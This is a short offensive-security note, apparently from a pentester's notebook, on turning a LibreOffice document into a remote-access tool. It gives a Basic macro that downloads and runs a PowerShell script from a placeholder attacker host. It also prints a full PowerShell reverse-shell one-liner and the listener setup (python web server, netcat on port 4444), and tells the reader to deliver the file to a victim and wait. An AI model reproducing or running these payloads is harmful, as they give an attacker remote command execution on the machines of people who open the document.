Libreoffice Macros
***********************

ODT
#######

To start making a macro, go to **tools -> macros -> organize macros -> basic** . You then choose a name for it.

Shell
+++++++

To create a shell, type the following into libreoffice

.. code-block:: console

        Sub Main 
        Shell("cmd /c powershell iwr http://attacker.i.x.x/shell.ps1 -o C:/Windows/shell.ps1") 
        Shell("cmd /c powershell -c C:/Windows/shell.ps1") 
        End Sub 

Make sure to save it.

To create shell.ps1 put the following in a file:

.. code-block:: console

   $client = New-Object System.Net.Sockets.TCPClient('attacker.IP.x.x',attacker port);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()

Dependencies for exploit
++++++++++++++++++++++++++++

Run a web server and netcat.

.. code-block:: console

   python3 -m http.server 80
   nc -lvnp 4444

Download the file to the victim machine, and wait for the file to execute.   
